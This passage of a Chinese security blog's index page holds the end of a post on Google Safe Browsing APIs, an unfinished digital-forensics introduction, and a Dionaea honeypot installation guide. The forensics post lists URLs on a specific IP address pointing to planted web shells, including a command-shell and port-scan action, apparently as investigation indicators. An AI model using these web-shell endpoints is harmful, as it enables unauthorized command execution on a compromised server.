<p>Response body:包含了匹配信息，列表名称和列表里匹配到的URL(如果匹配到)，元数据等。如果没有匹配，则HTTP POST响应只会在响应正文中返回一个空对象。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">  <span class="string">"matches"</span>: [&#123;</div><div class="line">    <span class="string">"threatType"</span>:      <span class="string">"MALWARE"</span>,</div><div class="line">    <span class="string">"platformType"</span>:    <span class="string">"WINDOWS"</span>,</div><div class="line">    <span class="string">"threatEntryType"</span>: <span class="string">"URL"</span>,</div><div class="line">    <span class="string">"threat"</span>:          &#123;<span class="string">"url"</span>: <span class="string">"http://www.urltocheck1.org/"</span>&#125;,</div><div class="line">    <span class="string">"threatEntryMetadata"</span>: &#123;</div><div class="line">      <span class="string">"entries"</span>: [&#123;</div><div class="line">        <span class="string">"key"</span>: <span class="string">"malware_threat_type"</span>,</div><div class="line">        <span class="string">"value"</span>: <span class="string">"landing"</span></div><div class="line">     &#125;]</div><div class="line">    &#125;,</div><div class="line">    <span class="string">"cacheDuration"</span>: <span class="string">"300.000s"</span></div><div class="line">  &#125;, &#123;</div><div class="line">    <span class="string">"threatType"</span>:      <span class="string">"MALWARE"</span>,</div><div class="line">    <span class="string">"platformType"</span>:    <span class="string">"WINDOWS"</span>,</div><div class="line">    <span class="string">"threatEntryType"</span>: <span class="string">"URL"</span>,</div><div class="line">    <span class="string">"threat"</span>:          &#123;<span class="string">"url"</span>: <span class="string">"http://www.urltocheck2.org/"</span>&#125;,</div><div class="line">    <span class="string">"threatEntryMetadata"</span>: &#123;</div><div class="line">      <span class="string">"entries"</span>: [&#123;</div><div class="line">        <span class="string">"key"</span>:   <span class="string">"malware_threat_type"</span>,</div><div class="line">        <span class="string">"value"</span>: <span class="string">"landing"</span></div><div class="line">     &#125;]</div><div class="line">    &#125;,</div><div class="line">    <span class="string">"cacheDuration"</span>: <span class="string">"300.000s"</span></div><div class="line">  &#125;]</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="Update-API-v4"><a href="#Update-API-v4" class="headerlink" title="Update API (v4)"></a>Update API (v4)</h5><p>​    Update API就是浏览器定期与Google Safe Browsing服务器通信，下载最新的加密版本的安全浏览列表，系统会将该列表的最新副本存储在您本地的系统上。浏览器会参照该本地列表检查您访问的每个网站对应的网址和下载的文件。如果您要浏览的网址出现在该列表中，Chrome 会向 Google 发送网址指纹的一部分（相应网址的 SHA-256 哈希值的前 32 位），以便验证该网址是否确实不安全。如果某个网站请求的权限可能不安全，Chrome 也会发送网址指纹的一部分；这样一来，如果该网站包含恶意内容，Google 就可以保护您免受攻击。</p>
<h6 id="优点-1"><a href="#优点-1" class="headerlink" title="优点"></a>优点</h6><p>隐私：服务器不知道实际查询的URL。</p>
<p>响应时间：不需要每次检查URL时查询服务器。</p>
<h6 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点"></a>缺点</h6><p>使用复杂</p>
<h6 id="Firefox本地缓存目录"><a href="#Firefox本地缓存目录" class="headerlink" title="Firefox本地缓存目录"></a>Firefox本地缓存目录</h6><ul>
<li><code>~/.cache/mozilla/firefox/XXXX/safebrowsing/</code> on Linux</li>
<li><code>~/Library/Caches/Firefox/Profiles/XXXX/safebrowsing/</code> on Mac</li>
<li><code>C:\Users\XXXX\AppData\Local\mozilla\firefox\profiles\XXXX\safebrowsing\</code> on Windows</li>
</ul>
<h6 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h6><p><a href="https://developers.google.com/safe-browsing/v4/update-api" target="_blank" rel="external">https://developers.google.com/safe-browsing/v4/update-api</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wsygoogol.github.io/2018/07/31/Google-Safe-Browsing-Api介绍/" data-id="cjprzgece000tsg9llx76nq33" class="article-share-link">Partager</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="w-数字取证入门" class="article article-type-w" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/06/29/数字取证入门/" class="article-date">
  <time datetime="2018-06-29T09:18:59.000Z" itemprop="datePublished">2018-06-29</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/06/29/数字取证入门/">数字取证入门</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="0x00-数字取证介绍"><a href="#0x00-数字取证介绍" class="headerlink" title="0x00 数字取证介绍"></a>0x00 数字取证介绍</h3><p>这篇文章将涵盖有关数字取证的各种主题，希望能够成为该领域的一个很好的介绍。数字取证（或计算机取证）是取证科学的最新分支，重点关注数字数据的恢复和后续分析/调查做为法庭上的有效证据。我的意思是，你不能再法庭上随便提出某些事情，将其称为证据。</p>
<p>因此，有必要通过适当的扣押、获取、分析、识别、确认、解释、记录以及最后的陈述来保存数字证据。</p>
<p>如你看到的，这是一个非常漫长而复杂的过程。鉴于其复杂性，数字取证操作通常需要一个专业的多学科团队。有些人可能专注于网络取证，其他人则专注于手机取证。一些行动甚至可能需要各种计算机相关领域的专家（硬件，数据库，电信等）。</p>
<p>通过本文，我将重点关注数字取证的法律/法庭相关方面，而不是私人调查方面，即使它们在技术上完全相同。</p>
<h6 id="数字证据"><a href="#数字证据" class="headerlink" title="数字证据"></a>数字证据</h6><p>证据，是证明某一命题是真实还是有效的。但是，数字证据的概念更为具体。 这样，它可以由存储在任何数字/电子存储介质中的任何类型的证明信息来定义，或者通过公共或私人计算机/通信网络传输。简单的说，它是以数字/二进制形式存储或传输的任何（证明）数据/信息。</p>
<p>我们越来越频繁地生成大量数据，这意味着它正变得无处不在。 因此，即使数字证据通常与计算机和电子犯罪有关，它现在也被用来起诉各种犯罪（例如，收回的电子邮件可能会泄露犯罪的意图或动机，甚至可能是失踪的人)。</p>
<p>在比较传统和数字证据时，我们会发现它们有一些相似之处：</p>
<p>它们既脆弱又易于操纵，损坏或毁坏;<br>他们可以通过物理方式或通过互联网轻松跨越地理和司法管辖区;<br>它们的价值通常取决于它们的确切日期/时间和地点（它们是时间敏感的）;</p>
<p>处理数字证据时我们面临的一些问题是：</p>
<h3 id="0x01-方法论和过程模型"><a href="#0x01-方法论和过程模型" class="headerlink" title="0x01 方法论和过程模型"></a>0x01 方法论和过程模型</h3><h3 id="0x02-取证的过程"><a href="#0x02-取证的过程" class="headerlink" title="0x02 取证的过程"></a>0x02 取证的过程</h3><p>hh</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">http://211.144.202.238:8080/1.asp</div><div class="line">http://211.144.202.238:8080/wt.asp</div><div class="line">http://211.144.202.238:8080/aspxspy.aspx</div><div class="line">http://211.144.202.238:8080/a.aspx</div><div class="line">http://211.144.202.238:8080/x.asp</div><div class="line">http://211.144.202.238:8080/1.asp?Action=MainMenu</div><div class="line">http://211.144.202.238:8080/1.asp?Action=Show1File</div><div class="line">http://211.144.202.238:8080/1.asp?Action=Cmd1Shell</div><div class="line">http://211.144.202.238:8080/1.asp?Action=ScanPort</div></pre></td></tr></table></figure>
<p>hh</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wsygoogol.github.io/2018/06/29/数字取证入门/" data-id="cjprzgecv001dsg9lfc5kb4c1" class="article-share-link">Partager</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="w-Dionaea蜜罐部署" class="article article-type-w" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/03/19/Dionaea蜜罐部署/" class="article-date">
  <time datetime="2018-03-19T03:02:28.000Z" itemprop="datePublished">2018-03-19</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/03/19/Dionaea蜜罐部署/">Dionaea蜜罐部署</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><a href="http://dionaea.readthedocs.io/en/latest/installation.html" target="_blank" rel="external">http://dionaea.readthedocs.io/en/latest/installation.html</a></p>
<h4 id="0x00-系统的内核版本和发行版本"><a href="#0x00-系统的内核版本和发行版本" class="headerlink" title="0x00 系统的内核版本和发行版本"></a>0x00 系统的内核版本和发行版本</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ uname -a</div><div class="line">Linux wsy-virtual-machine 4.4.0-116-generic <span class="comment">#140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span></div><div class="line">$ lsb_release -a</div><div class="line">No LSB modules are available.</div><div class="line">Distributor ID:	Ubuntu</div><div class="line">Description:	Ubuntu 16.04.4 LTS</div><div class="line">Release:	16.04</div><div class="line">Codename:	xenial</div></pre></td></tr></table></figure>
<h4 id="0x01-安装依赖"><a href="#0x01-安装依赖" class="headerlink" title="0x01 安装依赖"></a>0x01 安装依赖</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install autoconf automake build-essential check cython3 libcurl4-openssl-dev libemu-dev libev-dev libglib2.0-dev libloudmouth1-dev libnetfilter-queue-dev libnl-3-dev libpcap-dev libssl-dev libtool libudns-dev python3 python3-dev python3-bson python3-yaml ttf-liberation</div></pre></td></tr></table></figure>
<h4 id="0x02-安装dionaea"><a href="#0x02-安装dionaea" class="headerlink" title="0x02 安装dionaea"></a>0x02 安装dionaea</h4><p>下载源码：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git <span class="built_in">clone</span> https://github.com/DinoTools/dionaea.git</div><div class="line"><span class="built_in">cd</span>  dionaea</div></pre></td></tr></table></figure>
<p>成功安装所有依赖关系后,运行autreconf来构建或重建构建脚本,要进入./dionaea目录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">autoreconf -vi</div></pre></td></tr></table></figure>
<p>configure:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./configure --<span class="built_in">disable</span>-werror --prefix=/opt/dionaea --with-python=/usr/bin/python3 --with-cython-dir=/usr/bin --with-ev-include=/usr/include/ --with-ev-lib=/usr/lib --with-emu-lib=/usr/lib/libemu --with-emu-include=/usr/include --with-nl-include=/usr/include/libnl3 --with-nl-lib=/usr/lib</div></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">make</div><div class="line">make install</div></pre></td></tr></table></figure>
<p>蜜罐被装在了/opt/dionaea目录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">/opt/dionaea<span class="comment"># ls</span></div><div class="line">bin  etc  lib  var</div></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wsygoogol.github.io/2018/03/19/Dionaea蜜罐部署/" data-id="cjprzgecf000usg9l2m685cgd" class="article-share-link">Partager</a>
      
      
    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">__('next') &raquo;</a>
  </nav>
</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">June 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Articles récents</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2018/12/17/攻击者利用CertUtil-exe植入恶意软件/">攻击者利用CertUtil.exe植入恶意软件</a>
          </li>
        
          <li>
            <a href="/2018/09/17/Satori-物联网蠕虫分析/">Satori 物联网蠕虫分析</a>
          </li>
        
          <li>
            <a href="/2018/09/14/Suricata-tips/">Suricata tips</a>
          </li>
        
          <li>
            <a href="/2018/09/11/开源情报收集/">开源情报收集</a>
          </li>
        
          <li>
            <a href="/2018/09/06/构建SOC的机器学习分析模型/">构建SOC的机器学习分析模型</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <!--
<footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2018 SY0U<br>
      Propulsé by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
-->

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>

  </div>
</body>
</html>